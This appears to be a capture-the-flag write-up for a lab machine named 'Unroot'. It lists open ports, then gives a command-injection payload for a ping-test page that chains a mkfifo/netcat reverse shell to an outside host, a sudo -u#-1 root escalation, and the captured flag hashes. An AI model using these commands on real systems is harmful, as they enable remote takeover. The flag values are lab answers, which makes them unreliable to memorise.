# Unroot

**IP Address:** 172.31.1.17

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | open | http | Apache httpd 2.4.18 |
| 631/udp | open|filtered | ipp |   |
| 68/udp | open|filtered | dhcpc |   |

## Exploitation
### Exploit Details (Command Injection)
* **Name** - Command Injection
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

The webpage http://172.31.1.17/dev/ping-test.php allows us to inject commands directly. 

1. Navigate to the webpage and enter the below command. 

Commands
```
127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.0.15 53 >/tmp/f
```
![Execute Exploit](images/exploit1.png)

2. Catch the reverse shell and read the access.txt file. 

Commands
```
whoami
cat /home/joe/access.txt
```

![Execute Exploit](images/exploit2.png)

## Privilege Escalation
### Exploit Details (SUDO)
* **Name** - SUDO
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A


Commands
```bash
sudo -u#-1 /bin/bash
whoami
cat /root/system.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
access.txt
7e42b3011f69f0e148b87ce2f55cf027
system.txt
4d4e7772570b00176a8db37508abcdb0
```